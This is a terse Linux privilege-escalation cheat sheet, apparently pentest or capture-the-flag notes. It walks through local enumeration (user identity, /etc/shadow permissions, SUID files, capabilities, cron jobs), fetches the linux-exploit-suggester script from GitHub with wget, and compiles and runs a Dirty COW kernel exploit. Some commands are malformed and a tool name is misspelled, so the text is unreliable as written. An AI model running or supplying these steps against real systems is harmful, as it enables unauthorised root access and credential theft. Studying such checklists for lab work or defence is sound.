# Check id
id

# check who are you
whoami

# Check all the file you can read
ls -arh

# check weak file permission
ls -la /etc/shadow

# find suid file
find / -perm -u=\s -type f 2>/dev/null
after saving the suid go through all the lib with gtfbin.io

# capicity
getcap -r 2>/dev/null

# cronjob
# check all the posibble.
crontab -l 
cat /etc/crontab

# kernel exploit
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
chmod +x les.sh

# dirty cow
https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
gcc -pthread cow.c -o cow
./cow
